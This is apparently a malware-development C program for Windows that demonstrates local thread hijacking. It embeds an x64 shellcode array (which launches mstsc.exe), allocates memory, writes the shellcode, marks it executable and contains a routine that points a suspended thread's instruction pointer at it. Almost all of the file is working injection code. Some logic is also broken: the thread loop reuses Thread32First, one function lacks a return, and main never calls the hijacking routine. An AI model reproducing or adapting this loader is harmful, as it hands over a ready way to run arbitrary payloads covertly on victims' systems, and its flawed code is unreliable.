#include <Windows.h>
#include <stdio.h>
#include <tlhelp32.h>

// mstsc.exe payload
unsigned char Payload[] = {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,
0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,
0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,
0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,
0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,
0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,
0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,
0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,
0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,
0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,
0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,
0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x6d,0x73,0x74,
0x73,0x63,0x2e,0x65,0x78,0x65,0x00};


/*
dwMainThreadId -> Thread ID of the main thread of the local process. This helps us avoid targeting the main threads of local processes.
dwThreadId -> A pointer that receives the dwThreadId (Hijackable PID).
hThread -> A pointer to the handle that receives a handle to the hijackable thread.
*/

BOOL GetLocalThreadHandle(IN DWORD dwMainThreadId, OUT DWORD* dwThreadId, OUT HANDLE* hThread) {
    
    // Getting Local Process IDs
    DWORD           dwProcessId =   GetCurrentProcessId();
    HANDLE          hSnapShot =     NULL;
    THREADENTRY32   ThreadEntry =   {.dwSize = sizeof(THREADENTRY32)};

    // Creating snapshot to enumerate threads
    hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

    // When function fails it wil return this invale value based on the documentation
    if (hSnapShot == INVALID_HANDLE_VALUE){
        printf("[+] CreateToolhelp32Snaphot Failed With Error Code: %d \n", GetLastError());
        return FALSE;
    }

    // Retrieves information about the first thread by providing HANDLE to the made snapshot and point to the THREADENTRY32 pointer
    if (!Thread32First(hSnapShot, &ThreadEntry)){
        printf("[+] Thread32First Failed With Error Code: %d \n", GetLastError());
        return FALSE;
    }

    /*
    Verify if the thread is associated with the target process identified by dwProcessId. (dwProcessId holds the identifier of the target process.)
    Ensure that the thread is not the main thread (dwMainThreadId) to avoid interference with it.
    */
    do {
        if (ThreadEntry.th32OwnerProcessID == dwProcessId && ThreadEntry.th32ThreadID != dwMainThreadId){

            // Assign thread identifier to the pointer
            *dwThreadId = ThreadEntry.th32ThreadID;

            // Open a thread handle and assign it to the pointer
            *hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, ThreadEntry.th32ThreadID);

            // Verify if the value stored at the pointer is not zero
            if (*hThread == NULL){
                printf("[+] OpenThread Failed With Error Code: %d \n", GetLastError());

                break;
            }
        }
    } while (Thread32First(hSnapShot, &ThreadEntry));

    // Close Handle
    CloseHandle(hSnapShot);
}

BOOL InjectShellcodeToProcess(IN PBYTE pShellcode, IN SIZE_T sSizeShellcode, OUT PVOID* ppAddress) {
    // Store the original memory protection flags
    DWORD dwOldProtection = 0;

    // Allocate memory for the shellcode with the necessary privileges
    *ppAddress = VirtualAlloc(NULL, sSizeShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (*ppAddress == NULL) {
        printf("\t[!] VirtualAlloc Failed With Error Code: %d \n", GetLastError());
        return FALSE;
    }

    printf("\t[+] Allocated Memory At: 0x%p \n", *ppAddress);

    printf("\t[+] Press <Enter> To Write Payload ... \n");
    getchar();

    // Copy the shellcode into the allocated memory
    memcpy(*ppAddress, pShellcode, sSizeShellcode);
    printf("[+] Written %zu bytes\n", sSizeShellcode);

    // Change the memory protection flags to allow execution
    if (!VirtualProtect(*ppAddress, sSizeShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("\t[!] VirtualProtect Failed With Error Code: %d \n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

BOOL HijackingThread(IN HANDLE hThread, IN PVOID pAddress) {
    // Initialize the context structure to modify thread registers
    CONTEXT ThreadCtx = {.ContextFlags = CONTEXT_ALL};

    // Suspend the thread to inject shellcode
    SuspendThread(hThread);

    // Retrieve thread context information
    if (!GetThreadContext(hThread, &ThreadCtx)) {
        printf("\t[!] GetThreadContext Failed With Error Code: %d \n", GetLastError());
        return FALSE;
    }
    
    // Update the RIP (Instruction Pointer) register to point to our shellcode
    ThreadCtx.Rip = (DWORD64)pAddress;

    // Set the thread context with the new RIP value
    if (!SetThreadContext(hThread, &ThreadCtx)) {
        printf("\t[!] SetThreadContext Failed With Error Code: %d \n", GetLastError());
        return FALSE;
    }

    printf("\t[#] Press <Enter> To Continue ... \n");
    getchar();

    // Resume the suspended thread
    ResumeThread(hThread);

    // Wait for the thread to finish
    WaitForSingleObject(hThread, INFINITE);

    return TRUE;
}


int main(){
    HANDLE  hThread = NULL;
    DWORD   dwMainThreadId = 0,
                dwThreadId = 0;
    PVOID   pAddress = NULL;

    // Getting main thread ID
    dwMainThreadId = GetCurrentThreadId();
    printf("[+] Searching For A Thread ... \n");

    if (!GetLocalThreadHandle(dwMainThreadId, &dwThreadId, &hThread)){
        printf("[+] No Thread Found \n");
        return 1;
    }
    printf("[+] Thread Found: %d \n", dwThreadId);

    printf("[i] Writing Shellcode To The Local Process ... \n");
	if (!InjectShellcodeToProcess(Payload, sizeof(Payload), &pAddress)) {
		return -1;
	}
	printf("[+] DONE \n\n");
}